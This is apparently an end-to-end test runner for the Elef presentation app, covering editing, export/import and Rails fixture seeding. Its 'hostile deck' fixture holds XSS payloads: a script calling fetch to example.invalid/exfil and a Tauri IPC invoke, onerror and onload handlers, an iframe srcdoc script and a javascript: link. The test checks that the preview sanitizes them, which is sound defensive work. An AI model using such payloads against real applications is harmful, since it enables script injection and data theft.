import assert from "node:assert/strict"
import { execFileSync, spawnSync } from "node:child_process"
import { access, chmod, mkdtemp, mkdir, readFile, readdir, rm, writeFile } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { fileURLToPath } from "node:url"
import { createHash, randomUUID } from "node:crypto"
import { PIXEL_PNG_MARKDOWN } from "./scenarios/media-fixture.js"

const e2eRoot = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(e2eRoot, "../..")
const temporaryRoot = await mkdtemp(path.join(os.tmpdir(), "elef-desktop-e2e-"))
const libraryRoot = path.join(temporaryRoot, "Elef")
const seedDeck = path.join(libraryRoot, "E2E seed")
const conflictDeck = path.join(libraryRoot, "E2E conflict")
const hostileDeck = path.join(libraryRoot, "E2E hostile")
const archiveFixture = path.join(temporaryRoot, "E2E archive seed")
const importArchive = path.join(temporaryRoot, "E2E archive seed.elef")
const exportArchive = path.join(temporaryRoot, "E2E seed exported.elef")
const exportContents = path.join(temporaryRoot, "E2E seed exported")
// Both runners complete the same editing, media, snippet, and math scenarios
// against the same deck, so the final source assertion is identical.
const expectedSharedSource = `# Saved by shared scenario\n\nThe visual editor changed this text.\n\n${PIXEL_PNG_MARKDOWN}\n**text**\n\n$$\n\\alpha\n$$\n`
const expectedDesktopSource = expectedSharedSource
const expectedWebSource = expectedSharedSource
const hostileSource = [
  "# Hostile deck",
  "",
  "Safe preview text remains visible.",
  "",
  '<script>window.__elefHostileScriptRan = true; window.parent.postMessage("hostile", "*"); void fetch("https://example.invalid/exfil").catch(() => {}); window.__TAURI__?.core?.invoke?.("create_deck", { name: "Hostile IPC side effect", kind: "presentation" })</script>',
  "",
  '<img src="x" onerror="window.__elefHostileEventRan = true">',
  '<iframe src="https://example.invalid/frame" srcdoc="<script>parent.__elefHostileFrameRan = true</script>"></iframe>',
  "",
  '[unsafe link](javascript:window.__elefHostileLinkRan=true)',
  "",
  "![remote image](https://example.invalid/tracker.png)",
  "![data image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
  ""
].join("\n")

function normalizeLineEndings(source) {
  return source.replace(/\r\n/g, "\n")
}
const webTitle = "E2E seed"
let presentationId = null
let hostilePresentationId = null
let documentIds = []
const env = {
  ...process.env,
  ELEF_E2E_LIBRARY_ROOT: libraryRoot,
  ELEF_E2E_APP_BINARY: path.join(repoRoot, "desktop", "target", "debug", "elef-desktop"),
  ELEF_E2E_IMPORT_ARCHIVE: importArchive,
  ELEF_E2E_EXPORT_PATH: exportArchive,
  ELEF_E2E_SEED_DECK_ID: "a3d0f020-6605-4f9e-a96d-d825ee4b13f1"
}

async function hashTree(root, relative = "") {
  const entries = await readdir(path.join(root, relative), { withFileTypes: true })
  const result = {}
  for (const entry of entries) {
    const entryPath = path.posix.join(relative, entry.name)
    if (entry.isSymbolicLink()) throw new Error(`Unexpected symlink in .elef fixture: ${entryPath}`)
    if (entry.isDirectory()) Object.assign(result, await hashTree(root, entryPath))
    else if (entry.isFile()) {
      const bytes = await readFile(path.join(root, entryPath))
      result[entryPath] = createHash("sha256").update(bytes).digest("hex")
    } else {
      throw new Error(`Unexpected special file in .elef fixture: ${entryPath}`)
    }
  }
  return result
}

async function makeTreeAccessible(root) {
  await chmod(root, 0o700)
  for (const entry of await readdir(root, { withFileTypes: true })) {
    const entryPath = path.join(root, entry.name)
    if (entry.isDirectory()) await makeTreeAccessible(entryPath)
    else if (entry.isFile()) await chmod(entryPath, 0o600)
  }
}

function runRails(code) {
  const result = spawnSync("bin/rails", ["runner", "-e", "test", code], {
    cwd: repoRoot,
    env: { ...env, RAILS_ENV: "test" },
    encoding: "utf8"
  })
  if (result.error) throw result.error
  if (result.status !== 0) throw new Error(result.stderr || result.stdout || "Rails E2E fixture command failed")
  return result.stdout.trim()
}

try {
  await mkdir(seedDeck, { recursive: true })
  const libraryConfig = path.join(libraryRoot, ".elef")
  await mkdir(libraryConfig, { recursive: true })
  await writeFile(path.join(libraryConfig, "snippets.json"), JSON.stringify({
    schema_version: 1,
    entries: [{
      id: "personal-note",
      name: "Personal note",
      description: "A custom personal note",
      trigger: "note",
      category: "Markdown",
      body: "**${1:note}**",
      namespace: "/",
      built_in: false
    }]
  }))
  await writeFile(path.join(libraryConfig, "math-shortcuts.json"), JSON.stringify({
    schema_version: 1,
    entries: [{
      id: "personal-lambda",
      name: "Lambda",
      description: "The Greek letter lambda",
      prefix: "@",
      aliases: ["lambda"],
      expansion: "\\lambda",
      namespace: "@",
      built_in: false
    }]
  }))
  await writeFile(path.join(seedDeck, "presentation.md"), "# Before E2E\n\nSeed paragraph.\n")
  await writeFile(path.join(seedDeck, "elef.json"), JSON.stringify({
    id: "a3d0f020-6605-4f9e-a96d-d825ee4b13f1",
    schema_version: 1
  }))
  await mkdir(conflictDeck, { recursive: true })
  await writeFile(path.join(conflictDeck, "presentation.md"), "# Before conflict test\n\nSeed paragraph.\n")
  await writeFile(path.join(conflictDeck, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  await mkdir(hostileDeck, { recursive: true })
  await writeFile(path.join(hostileDeck, "presentation.md"), hostileSource)
  await writeFile(path.join(hostileDeck, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  await mkdir(archiveFixture, { recursive: true })
  await writeFile(path.join(archiveFixture, "presentation.md"), "# Imported from Elef\n\nPortable archive fixture.\n")
  await writeFile(path.join(archiveFixture, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  execFileSync("zip", ["-q", "-r", importArchive, path.basename(archiveFixture)], { cwd: temporaryRoot })
  for (const [name, source] of [
    ["E2E document", "# E2E document\n\nSee [[E2E linked]].\n"],
    ["E2E linked", "# E2E linked\n\nTarget document.\n"]
  ]) {
    const folder = path.join(libraryRoot, name)
    await mkdir(folder, { recursive: true })
    await writeFile(path.join(folder, "document.md"), source)
    await writeFile(path.join(folder, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  }

  if (process.env.CI) {
    const seeded = runRails(
      `presentation = Presentation.create!(title: ${JSON.stringify(webTitle)}, source: "# Before E2E\\n\\nSeed paragraph.\\n"); conflict = Presentation.create!(title: "E2E conflict", source: "# Before conflict test\\n\\nSeed paragraph.\\n"); hostile = Presentation.create!(title: "E2E hostile", source: ${JSON.stringify(hostileSource)}); document = Document.create!(source: "# E2E document\\n\\nSee [[E2E linked]].\\n"); linked = Document.create!(source: "# E2E linked\\n\\nTarget document.\\n"); puts "ELEF_E2E_PRESENTATION_ID=#{presentation.id}"; puts "ELEF_E2E_CONFLICT_PRESENTATION_ID=#{conflict.id}"; puts "ELEF_E2E_HOSTILE_PRESENTATION_ID=#{hostile.id}"; puts "ELEF_E2E_DOCUMENT_IDS=#{[document.id, linked.id].join(',')}"`
    )
    const id = seeded.match(/^ELEF_E2E_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(id, /^\d+$/, "Rails fixture command should return the presentation id")
    presentationId = id
    const conflictId = seeded.match(/^ELEF_E2E_CONFLICT_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(conflictId, /^\d+$/, "Rails fixture command should return the conflict presentation id")
    env.ELEF_E2E_CONFLICT_PRESENTATION_ID = conflictId
    hostilePresentationId = seeded.match(/^ELEF_E2E_HOSTILE_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(hostilePresentationId, /^\d+$/, "Rails fixture command should return the hostile presentation id")
    env.ELEF_E2E_HOSTILE_PRESENTATION_ID = hostilePresentationId
    const docs = seeded.match(/^ELEF_E2E_DOCUMENT_IDS=(\d+,\d+)$/m)?.[1]
    assert.ok(docs, "Rails fixture command should return document IDs")
    documentIds = docs.split(",")
    env.ELEF_E2E_PRESENTATION_ID = id
    env.ELEF_E2E_DOCUMENT_ID = documentIds[0]
    env.ELEF_E2E_LINKED_DOCUMENT_ID = documentIds[1]
    env.ELEF_E2E_START_WEB_SERVER = "1"
  }

  if (presentationId) {
    const playwright = path.join(e2eRoot, "node_modules", ".bin", "playwright")
    const webResult = spawnSync(playwright, ["test", "--project=web"], {
      cwd: e2eRoot,
      env,
      stdio: "inherit"
    })
    if (webResult.error) throw webResult.error
    if (webResult.status !== 0) throw new Error("Shared web scenarios failed with status " + webResult.status)
  }

  const webdriverio = path.join(e2eRoot, "node_modules", ".bin", "wdio")
  const desktopResult = spawnSync(webdriverio, ["run", "wdio.conf.js"], {
    cwd: e2eRoot,
    env: {
      ...env,
      TAURI_WEBDRIVER_PORT: process.env.TAURI_WEBDRIVER_PORT || "4445"
    },
    stdio: "inherit"
  })
  if (desktopResult.error) throw desktopResult.error
  if (desktopResult.status !== 0) throw new Error("Shared desktop scenarios failed with status " + desktopResult.status)

  const desktopSource = await readFile(path.join(seedDeck, "presentation.md"), "utf8")
  assert.equal(normalizeLineEndings(desktopSource), expectedDesktopSource)
  try {
    await access(path.join(libraryRoot, "Hostile IPC side effect"))
    throw new Error("Hostile deck content reached the create_deck IPC command")
  } catch (error) {
    if (error.code !== "ENOENT") throw error
  }
  assert.equal(
    await readFile(path.join(libraryRoot, "E2E archive seed", "presentation.md"), "utf8"),
    "# Imported from Elef\n\nPortable archive fixture.\n"
  )
  await access(exportArchive)
  execFileSync("unzip", ["-q", "-o", exportArchive, "-d", exportContents])
  await makeTreeAccessible(exportContents)
  assert.deepEqual(await hashTree(exportContents), await hashTree(seedDeck),
    "Exporting a deck must preserve every file byte, including its manifest and uploaded image")
  if (presentationId) {
    const persisted = runRails(
      "presentation = Presentation.find(" + presentationId + "); puts \"ELEF_E2E_SOURCE=#{presentation.source.to_json}\"; presentation.destroy!; Presentation.where(id: [" + [Number(env.ELEF_E2E_CONFLICT_PRESENTATION_ID), Number(hostilePresentationId)].join(",") + "]).destroy_all; Document.where(id: [" + documentIds.map(Number).join(",") + "]).destroy_all"
    )
    const savedSource = persisted.match(/^ELEF_E2E_SOURCE=(.*)$/m)?.[1]
    assert.ok(savedSource, "Rails fixture command should return the persisted source")
    assert.equal(normalizeLineEndings(JSON.parse(savedSource)), expectedWebSource)
  }
} finally {
  if (presentationId) {
    try {
      runRails(`Presentation.find_by(id: ${presentationId})&.destroy!`)
      runRails(`Presentation.find_by(id: ${Number(hostilePresentationId)})&.destroy!`)
      if (env.ELEF_E2E_CONFLICT_PRESENTATION_ID) {
        runRails(`Presentation.find_by(id: ${Number(env.ELEF_E2E_CONFLICT_PRESENTATION_ID)})&.destroy!`)
      }
      runRails(`Document.where(id: [${documentIds.map(Number).join(",")}]).destroy_all`)
    } catch (_error) {
      // Preserve the browser/test failure while making fixture cleanup best-effort.
    }
  }
  await makeTreeAccessible(temporaryRoot)
  await rm(temporaryRoot, { recursive: true, force: true })
}
